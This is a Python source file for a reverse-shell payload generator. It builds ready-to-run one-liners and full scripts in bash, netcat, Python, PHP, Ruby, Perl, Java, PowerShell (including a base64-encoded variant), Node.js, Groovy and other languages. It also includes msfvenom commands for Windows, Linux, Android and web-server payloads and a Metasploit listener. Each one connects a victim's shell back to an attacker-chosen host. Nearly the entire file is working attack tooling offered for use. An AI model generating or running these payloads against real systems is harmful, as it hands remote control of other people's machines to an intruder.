#!/usr/bin/env python3
"""
SHREK PAYLOAD GENERATOR (Python Version)
=========================================
Generate reverse shells and payloads without requiring Metasploit.
Based on: https://github.com/dx7er/Shrek
"""

import base64
import urllib.parse
from typing import Dict, List


class ShrekPayloadGenerator:
    """
    Generate various reverse shell payloads.
    No external dependencies - pure Python generation.
    """
    
    @staticmethod
    def bash_tcp(lhost: str, lport: int) -> str:
        """Bash TCP reverse shell"""
        return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    
    @staticmethod
    def bash_udp(lhost: str, lport: int) -> str:
        """Bash UDP reverse shell"""
        return f"sh -i >& /dev/udp/{lhost}/{lport} 0>&1"
    
    @staticmethod
    def bash_196(lhost: str, lport: int) -> str:
        """Bash /dev/tcp method"""
        return f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196"
    
    @staticmethod
    def bash_readline(lhost: str, lport: int) -> str:
        """Bash with readline"""
        return f"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done"
    
    @staticmethod
    def nc_traditional(lhost: str, lport: int) -> str:
        """Netcat traditional"""
        return f"nc -e /bin/sh {lhost} {lport}"
    
    @staticmethod
    def nc_openbsd(lhost: str, lport: int) -> str:
        """Netcat OpenBSD (no -e flag)"""
        return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
    
    @staticmethod
    def nc_busybox(lhost: str, lport: int) -> str:
        """Netcat BusyBox"""
        return f"rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
    
    @staticmethod
    def ncat_ssl(lhost: str, lport: int) -> str:
        """Ncat with SSL"""
        return f"ncat --ssl {lhost} {lport} -e /bin/sh"
    
    @staticmethod
    def python_short(lhost: str, lport: int) -> str:
        """Python short one-liner"""
        return f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    
    @staticmethod
    def python3_short(lhost: str, lport: int) -> str:
        """Python3 short one-liner"""
        return f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    
    @staticmethod
    def python_full(lhost: str, lport: int) -> str:
        """Python full reverse shell script"""
        return f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])'''
    
    @staticmethod
    def python_pty(lhost: str, lport: int) -> str:
        """Python with PTY for interactive shell"""
        return f'''python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' '''
    
    @staticmethod
    def php_exec(lhost: str, lport: int) -> str:
        """PHP exec reverse shell"""
        return f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    
    @staticmethod
    def php_shell_exec(lhost: str, lport: int) -> str:
        """PHP shell_exec reverse shell"""
        return f"php -r '$sock=fsockopen(\"{lhost}\",{lport});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    
    @staticmethod
    def php_full(lhost: str, lport: int) -> str:
        """PHP full reverse shell"""
        return f'''<?php
$sock = fsockopen("{lhost}", {lport});
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>'''
    
    @staticmethod
    def php_pentestmonkey(lhost: str, lport: int) -> str:
        """PHP PentestMonkey style"""
        return f'''<?php set_time_limit(0);$ip='{lhost}';$port={lport};$chunk_size=1400;$write_a=null;$error_a=null;$shell='uname -a; w; id; /bin/sh -i';$daemon=0;$debug=0;if(function_exists('pcntl_fork')){{$pid=pcntl_fork();if($pid==-1){{exit(1);}}if($pid){{exit(0);}}if(posix_setsid()==-1){{exit(1);}}}}$sock=fsockopen($ip,$port,$errno,$errstr,30);if(!$sock){{exit(1);}}$descriptorspec=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$process=proc_open($shell,$descriptorspec,$pipes);if(!is_resource($process)){{exit(1);}}stream_set_blocking($pipes[0],0);stream_set_blocking($pipes[1],0);stream_set_blocking($pipes[2],0);stream_set_blocking($sock,0);while(1){{if(feof($sock)){{break;}}if(feof($pipes[1])){{break;}}$read_a=array($sock,$pipes[1],$pipes[2]);$num_changed_sockets=stream_select($read_a,$write_a,$error_a,null);if(in_array($sock,$read_a)){{$input=fread($sock,$chunk_size);fwrite($pipes[0],$input);}}if(in_array($pipes[1],$read_a)){{$input=fread($pipes[1],$chunk_size);fwrite($sock,$input);}}if(in_array($pipes[2],$read_a)){{$input=fread($pipes[2],$chunk_size);fwrite($sock,$input);}}}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);?>'''
    
    @staticmethod
    def ruby(lhost: str, lport: int) -> str:
        """Ruby reverse shell"""
        return f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    
    @staticmethod
    def ruby_full(lhost: str, lport: int) -> str:
        """Ruby full script"""
        return f'''require 'socket'
f=TCPSocket.open("{lhost}",{lport}).to_i
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'''
    
    @staticmethod
    def perl(lhost: str, lport: int) -> str:
        """Perl reverse shell"""
        return f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    
    @staticmethod
    def perl_nosh(lhost: str, lport: int) -> str:
        """Perl without /bin/sh"""
        return f"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{lhost}:{lport}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
    
    @staticmethod
    def java(lhost: str, lport: int) -> str:
        """Java reverse shell"""
        return f'''public class RevShell {{
    public static void main(String[] args) throws Exception {{
        Runtime r = Runtime.getRuntime();
        String[] cmd = {{"/bin/sh", "-c", "exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done"}};
        Process p = r.exec(cmd);
        p.waitFor();
    }}
}}'''
    
    @staticmethod
    def java_runtime(lhost: str, lport: int) -> str:
        """Java Runtime.exec()"""
        return f'Runtime.getRuntime().exec("/bin/bash -c bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")'
    
    @staticmethod
    def powershell(lhost: str, lport: int) -> str:
        """PowerShell reverse shell"""
        return f'''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'''
    
    @staticmethod
    def powershell_base64(lhost: str, lport: int) -> str:
        """PowerShell base64 encoded"""
        cmd = f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        encoded = base64.b64encode(cmd.encode('utf-16-le')).decode()
        return f"powershell -enc {encoded}"
    
    @staticmethod
    def awk(lhost: str, lport: int) -> str:
        """AWK reverse shell"""
        return f'awk \'BEGIN {{s = "/inet/tcp/0/{lhost}/{lport}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}\' /dev/null'
    
    @staticmethod
    def lua(lhost: str, lport: int) -> str:
        """Lua reverse shell"""
        return f'''lua -e "require('socket');require('os');t=socket.tcp();t:connect('{lhost}','{lport}');os.execute('/bin/sh -i <&3 >&3 2>&3');"'''
    
    @staticmethod
    def socat(lhost: str, lport: int) -> str:
        """Socat reverse shell"""
        return f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}"
    
    @staticmethod
    def socat_tty(lhost: str, lport: int) -> str:
        """Socat with TTY"""
        return f"socat tcp-connect:{lhost}:{lport} exec:/bin/sh,pty,stderr,setsid,sigint,sane"
    
    @staticmethod
    def nodejs(lhost: str, lport: int) -> str:
        """Node.js reverse shell"""
        return f'''(function(){{var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect({lport},"{lhost}",function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();'''
    
    @staticmethod
    def groovy(lhost: str, lport: int) -> str:
        """Groovy reverse shell (for Jenkins)"""
        return f'''String host="{lhost}";int port={lport};String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}};}};p.destroy();s.close();'''
    
    @staticmethod
    def telnet(lhost: str, lport: int) -> str:
        """Telnet reverse shell"""
        lport2 = lport + 1
        return f"rm -f /tmp/p; mknod /tmp/p p && telnet {lhost} {lport} 0</tmp/p | /bin/sh 1>/tmp/p"
    
    @staticmethod
    def xterm(lhost: str, lport: int) -> str:
        """Xterm reverse shell (requires X server)"""
        return f"xterm -display {lhost}:1"
    
    @staticmethod
    def msfvenom_windows_exe(lhost: str, lport: int) -> str:
        """MSFvenom command for Windows EXE"""
        return f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > shell.exe"
    
    @staticmethod
    def msfvenom_linux_elf(lhost: str, lport: int) -> str:
        """MSFvenom command for Linux ELF"""
        return f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > shell.elf"
    
    @staticmethod
    def msfvenom_android_apk(lhost: str, lport: int) -> str:
        """MSFvenom command for Android APK"""
        return f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > shell.apk"
    
    @staticmethod
    def msfvenom_php(lhost: str, lport: int) -> str:
        """MSFvenom command for PHP"""
        return f"msfvenom -p php/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f raw > shell.php"
    
    @staticmethod
    def msfvenom_asp(lhost: str, lport: int) -> str:
        """MSFvenom command for ASP"""
        return f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f asp > shell.asp"
    
    @staticmethod
    def msfvenom_war(lhost: str, lport: int) -> str:
        """MSFvenom command for WAR (Tomcat)"""
        return f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f war > shell.war"
    
    @staticmethod
    def metasploit_handler(lhost: str, lport: int, payload: str = "windows/meterpreter/reverse_tcp") -> str:
        """Metasploit handler commands"""
        return f'''msfconsole -q -x "use multi/handler;
set PAYLOAD {payload};
set LHOST {lhost};
set LPORT {lport};
run;"'''
    
    @classmethod
    def get_all_shells(cls, lhost: str, lport: int) -> Dict[str, str]:
        """Get all available reverse shells"""
        return {
            # Bash
            'bash_tcp': cls.bash_tcp(lhost, lport),
            'bash_udp': cls.bash_udp(lhost, lport),
            'bash_196': cls.bash_196(lhost, lport),
            'bash_readline': cls.bash_readline(lhost, lport),
            
            # Netcat
            'nc_traditional': cls.nc_traditional(lhost, lport),
            'nc_openbsd': cls.nc_openbsd(lhost, lport),
            'nc_busybox': cls.nc_busybox(lhost, lport),
            'ncat_ssl': cls.ncat_ssl(lhost, lport),
            
            # Python
            'python_short': cls.python_short(lhost, lport),
            'python3_short': cls.python3_short(lhost, lport),
            'python_pty': cls.python_pty(lhost, lport),
            
            # PHP
            'php_exec': cls.php_exec(lhost, lport),
            'php_shell_exec': cls.php_shell_exec(lhost, lport),
            
            # Other languages
            'ruby': cls.ruby(lhost, lport),
            'perl': cls.perl(lhost, lport),
            'lua': cls.lua(lhost, lport),
            'nodejs': cls.nodejs(lhost, lport),
            'awk': cls.awk(lhost, lport),
            
            # Windows
            'powershell': cls.powershell(lhost, lport),
            
            # Socat/Telnet
            'socat': cls.socat(lhost, lport),
            'telnet': cls.telnet(lhost, lport),
            
            # MSFvenom commands
            'msfvenom_windows': cls.msfvenom_windows_exe(lhost, lport),
            'msfvenom_linux': cls.msfvenom_linux_elf(lhost, lport),
            'msfvenom_android': cls.msfvenom_android_apk(lhost, lport),
        }
    
    @classmethod
    def get_by_category(cls, lhost: str, lport: int) -> Dict[str, Dict[str, str]]:
        """Get shells organized by category"""
        return {
            'Linux Bash': {
                'Bash TCP': cls.bash_tcp(lhost, lport),
                'Bash UDP': cls.bash_udp(lhost, lport),
                'Bash /dev/tcp': cls.bash_196(lhost, lport),
            },
            'Netcat': {
                'NC Traditional (-e)': cls.nc_traditional(lhost, lport),
                'NC OpenBSD (no -e)': cls.nc_openbsd(lhost, lport),
                'NC BusyBox': cls.nc_busybox(lhost, lport),
                'Ncat SSL': cls.ncat_ssl(lhost, lport),
            },
            'Python': {
                'Python 2': cls.python_short(lhost, lport),
                'Python 3': cls.python3_short(lhost, lport),
                'Python PTY': cls.python_pty(lhost, lport),
            },
            'PHP': {
                'PHP exec': cls.php_exec(lhost, lport),
                'PHP shell_exec': cls.php_shell_exec(lhost, lport),
            },
            'Ruby/Perl': {
                'Ruby': cls.ruby(lhost, lport),
                'Perl': cls.perl(lhost, lport),
            },
            'Windows PowerShell': {
                'PowerShell': cls.powershell(lhost, lport),
                'PowerShell Base64': cls.powershell_base64(lhost, lport),
            },
            'Other': {
                'Node.js': cls.nodejs(lhost, lport),
                'Lua': cls.lua(lhost, lport),
                'AWK': cls.awk(lhost, lport),
                'Socat': cls.socat(lhost, lport),
                'Groovy (Jenkins)': cls.groovy(lhost, lport),
            },
            'MSFvenom Commands': {
                'Windows EXE': cls.msfvenom_windows_exe(lhost, lport),
                'Linux ELF': cls.msfvenom_linux_elf(lhost, lport),
                'Android APK': cls.msfvenom_android_apk(lhost, lport),
                'PHP': cls.msfvenom_php(lhost, lport),
                'ASP': cls.msfvenom_asp(lhost, lport),
                'WAR (Tomcat)': cls.msfvenom_war(lhost, lport),
            }
        }


# Singleton
_shrek_instance = None

def get_shrek_generator() -> ShrekPayloadGenerator:
    """Get singleton instance"""
    global _shrek_instance
    if _shrek_instance is None:
        _shrek_instance = ShrekPayloadGenerator()
    return _shrek_instance


if __name__ == '__main__':
    # Test
    gen = ShrekPayloadGenerator()
    
    print("=== SHREK PAYLOAD GENERATOR ===\n")
    
    shells = gen.get_all_shells("10.0.0.1", 4444)
    
    for name, shell in list(shells.items())[:5]:
        print(f"[{name}]")
        print(f"  {shell[:100]}...")
        print()
